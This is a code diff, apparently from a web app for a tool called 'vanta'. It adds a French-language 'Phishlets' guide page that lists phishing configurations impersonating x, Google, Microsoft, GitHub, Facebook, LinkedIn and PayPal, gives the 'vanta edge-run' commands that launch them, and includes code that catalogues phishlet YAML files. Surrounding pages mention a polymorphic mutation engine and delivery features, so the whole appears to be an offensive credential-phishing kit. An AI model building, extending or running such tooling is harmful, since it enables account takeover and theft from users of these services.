@@ -102,6 +102,22 @@ vanta lunar          # Mode avancé (mutation+scanner+autopilot)
             <p>Moteur polymorphe (HTML/JS) + Scanner statique + cycle AutoPilot.</p>
           </section>
         """,
+        "phishlets": """
+          <section>
+            <h2>Phishlets</h2>
+            <p>Catalogue: x, google, microsoft, github, facebook, linkedin, paypal, preset_demo.</p>
+            <pre>
+vanta phishlets-list
+vanta edge-run --name x
+vanta edge-run --name google
+vanta edge-run --name microsoft
+vanta edge-run --name github
+vanta edge-run --name facebook
+vanta edge-run --name linkedin
+vanta edge-run --name paypal
+            </pre>
+          </section>
+        """,
         "ethics": """
           <section>
             <h2>Éthique & Sécurité</h2>
@@ -126,6 +142,24 @@ vanta lunar          # Mode avancé (mutation+scanner+autopilot)
         """
     }
 
+    # Dynamic listing for phishlets page
+    dynamic_section = ""
+    if page == "phishlets":
+        try:
+            import os, yaml
+            entries = []
+            for fn in os.listdir("phishlets"):
+                if fn.endswith(".yaml"):
+                    with open(os.path.join("phishlets", fn), "r") as f:
+                        data = yaml.safe_load(f)
+                    name = data.get("name", fn[:-5])
+                    entries.append(f"- {fn[:-5]} → {name}")
+            if entries:
+                dynamic_section = "<h3>Catalogue détecté</h3><pre>" + "\\n".join(entries) + "</pre>"
+        except Exception:
+            pass
+        pages["phishlets"] = pages["phishlets"].replace("</section>", dynamic_section + "</section>")
+
     nav = """
       <nav>
         <a href="/v5/guide?page=home">Accueil</a>
@@ -133,6 +167,7 @@ vanta lunar          # Mode avancé (mutation+scanner+autopilot)
         <a href="/v5/guide?page=delivery">Delivery</a>
         <a href="/v5/guide?page=edge">Edge</a>
         <a href="/v5/guide?page=mutation">Mutation</a>
+        <a href="/v5/guide?page=phishlets">Phishlets</a>
         <a href="/v5/guide?page=network">Réseau</a>
         <a href="/v5/guide?page=ethics">Éthique</a>
       </nav>
